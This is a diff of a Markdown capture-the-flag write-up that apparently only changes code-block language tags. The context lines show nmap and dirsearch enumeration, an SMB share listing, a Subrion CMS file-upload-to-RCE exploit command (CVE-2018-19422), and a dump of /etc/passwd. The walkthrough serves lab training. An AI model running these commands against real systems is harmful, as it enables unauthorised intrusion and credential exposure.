@@ -24,7 +24,7 @@
 
 
 * Nmap Report:
-  ```sh linenums="1" hl_lines="6 11 14 15 45"
+  ```s linenums="1" hl_lines="6 11 14 15 45"
     # Nmap 7.93 scan initiated Fri Feb 24 22:02:22 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.166.73
     Nmap scan report for 10.10.166.73
     Host is up (0.16s latency).
@@ -90,7 +90,7 @@ At first, I accessed to the HTTP port on port 80, which led me to a default Apac
 
 Then, I ran **dirsearch** to perform enumeration of the webserver's hidden directories, which yielded the following results.
 
-```sh linenums="1" hl_lines="25 26"
+```s linenums="1" hl_lines="25 26"
     Target: http://10.10.166.73/
     [22:06:17] Starting: 
     [22:06:24] 403 -  278B  - /.ht_wsr.txt                                     
@@ -133,11 +133,11 @@ I enumerated even further with **/test** folder to find sub-folders. but wasn't 
 
 !!! tip "SMB Enumeration"
 
-    ``` dtd
+    ```s
     smbclient -L //10.10.166.73 
     ```
 
-    ``` dtd
+    ```s
     Password for [WORKGROUP\kali]:
 
         Sharename       Type      Comment
@@ -153,7 +153,7 @@ To access the share, I used the following command:
 
 Upon accessing the share, I got a text file that contained a hint regarding a hidden CMS folder located on the web server. 
 
-```sh linenums="1" hl_lines="4 10"
+```dtd linenums="1" hl_lines="4 10"
 GOALS
 =====
 1)Make fake popup and host it online on Digital Ocean server
@@ -180,8 +180,8 @@ I identified a possible RCE attack. Executing the following command led to my in
 
 !!! danger "Arbitary File Upload"
 
-    ``` dtd
-    python3 49876.py -u http://10.10.166.73/subrion/panel/ -l admin -p {--REDACTED--}
+    ```py
+    python3 49876.py -u http://10.10.166.73/subrion/panel/ -l admin -p [REDACTED]
 
     [+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
 
@@ -209,7 +209,7 @@ To elevate my access privileges, I attempted to establish a reverse shell from t
 
 At this point, I decided to enumerate the server's users further. I ran `/etc/passwd` and discovered the usernames.
 
-``` dtd linenums="1" hl_lines="30"
+```s linenums="1" hl_lines="30"
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
